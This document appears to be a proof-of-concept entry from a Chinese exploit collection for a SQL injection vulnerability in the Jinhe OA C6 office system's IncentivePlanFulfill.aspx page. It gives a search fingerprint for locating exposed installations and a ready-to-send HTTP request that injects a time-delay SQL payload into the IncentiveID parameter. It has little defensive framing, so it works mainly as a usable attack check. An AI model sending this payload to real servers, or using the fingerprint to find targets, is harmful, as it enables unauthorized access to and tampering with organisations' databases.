﻿# 金和OA-C6-IncentivePlanFulfill.aspx SQL注入漏洞

> 更新时间：2024-03-21

> 漏洞编号：

> 漏洞说明：金和OA协同办公管理系统IncentivePlanFulfill.aspx存在SQL注入漏洞。攻击者可以通过构造恶意的SQL语句，成功注入并执行恶意数据库操作，可能导致敏感信息泄露、数据库被篡改或其他严重后果

> 漏洞特征：app="金和网络-金和OA"

> 验证脚本：HTTP

```
GET /C6/JHSoft.Web.IncentivePlan/IncentivePlanFulfill.aspx/?IncentiveID=1WAITFOR+DELAY+%270:0:6%27--&TVersion=1 HTTP/1.1
Connection: close
Cookie: ASP.NET_SessionId=0uha1u0nhrn4meghddjiwu0y
Accept-Encoding: gzip

```

> 响应代码特征：200

> 响应内容特征：

> 上传文件定位：

> 验证文件来源：金和OA-C6-IncentivePlanFulfill.aspx SQL注入漏洞.poc

